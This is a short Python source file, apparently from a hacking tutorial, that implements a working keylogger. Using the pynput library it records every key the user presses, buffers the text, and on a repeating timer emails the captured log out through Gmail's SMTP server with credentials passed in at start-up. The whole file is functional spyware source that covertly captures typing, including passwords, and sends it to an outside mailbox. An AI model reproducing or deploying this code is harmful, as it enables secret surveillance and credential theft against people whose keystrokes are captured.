#!usr/bin/env python
#import Pynput.keyborad as we need to record the key strikes 
import pynput.keyboard
import smtplib
import threading
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password


    def append_to_log(self, string):
        self.log = self.log + string


    def process_key_press(self, key):
        '''a callback function that will execute everytime a user
        presses a key on the keyborad 
        variable key is the key pressed by the user'''
        try:
            current_key = str(key.char)
            #self.append_to_log(str(key.char))
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '
        self.append_to_log(current_key)
        
    def report(self):
        '''we will run this fucntion on as different thread so that our main 
        function also runs at the same time '''
        self.send_mail(self.email, self.password,"\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def send_mail(self, email, password, message):
        '''sending the mail using the google smtp server on port 587'''
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()


    def start(self):
        '''create a keyboard listener object that will listen for key strikes
        entered on the keyboard'''
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        #with keyword in python is used to interact with unmanaged streams of data
        #starting the keyboard listner
        with  keyboard_listener:
            self.report()
            keyboard_listener.join()


